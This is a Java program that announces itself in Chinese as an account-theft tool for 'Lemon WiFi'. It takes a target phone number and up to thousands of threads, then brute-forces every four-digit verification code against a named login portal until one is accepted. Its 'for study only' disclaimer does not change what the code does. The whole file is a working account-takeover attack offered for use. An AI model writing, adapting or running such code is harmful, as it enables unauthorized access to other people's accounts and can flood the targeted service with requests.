package cn.xiaohai;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Main {
    public static void main(String[] args) {
        //写一个欢迎以及介绍和使用说明和注意
        System.out.println("欢迎使用柠檬WiFi盗号工具");
        System.out.println("作者：Xiaohai");
        System.out.println("使用说明: 请输入手机号和线程数，程序将自动开始破解");
        System.out.println("注意: 本工具仅供学习和研究使用，请勿用于非法用途");
        System.out.println("线程数越多，破解速度越快，但是也会占用更多的系统资源");
        System.out.println("线程会暂用带宽资源, 线程太多可能导致带宽资源耗尽");
        System.out.println("带宽资源耗尽可能导致盗号失败");
        System.out.println("建议使用1000线程");
        System.out.println("如果破解失败可以尝试重试 或则 获取新的验证码");
        String url = "http://lemonwifi.cn:80/portal/login";
        Scanner scanner = new Scanner(System.in);
        System.out.println("请输入手机号");


        String username = scanner.nextLine();
        System.out.println("请输入线程数");
//        int threadCount = 5000; // 自定义线程数量，根据需要调整 使用前把下面的注释去掉
         int threadCount = scanner.nextInt();

        ExecutorService executor = Executors.newFixedThreadPool(threadCount);
        int rangePerThread = 10000 / threadCount; // 每个线程负责的验证码范围

        // 为每个线程分配开始和结束的范围
        for (int i = 0; i < threadCount; i++) {
            int start = i * rangePerThread;
            int end = (i == threadCount - 1) ? 9999 : (start + rangePerThread - 1); // 最后一个线程到9999

            executor.execute(new PasswordCracker(url, username, start, end));
        }
        executor.shutdown();
    }
}

class PasswordCracker implements Runnable {
    private final String url;
    private final String username;
    private final int start;
    private final int end;

    public PasswordCracker(String url, String username, int start, int end) {
        this.url = url;
        this.username = username;
        this.start = start;
        this.end = end;
    }

    @Override
    public void run() {
        for (int num = start; num <= end; num++) {
            String password = String.format("%04d", num); // 格式化为四位密码
            System.out.println("尝试验证码: " + password);

            try {
                URL obj = new URL(url);
                HttpURLConnection con = (HttpURLConnection) obj.openConnection();

                con.setRequestMethod("POST");
                con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                String urlParameters = "username=" + username + "&password=" + password;
                con.setDoOutput(true);
                try (OutputStream os = con.getOutputStream()) {
                    os.write(urlParameters.getBytes());
                    os.flush();
                }

                int responseCode = con.getResponseCode();
                if (responseCode == 403) {
                    System.out.println("找到验证码: " + password);
                    System.exit(0); // 找到验证码后退出
                }

                try (BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()))) {
                    String inputLine;
                    StringBuilder response = new StringBuilder();
                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
//                    System.out.println("Response: " + response.toString()); //打印响应内容
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
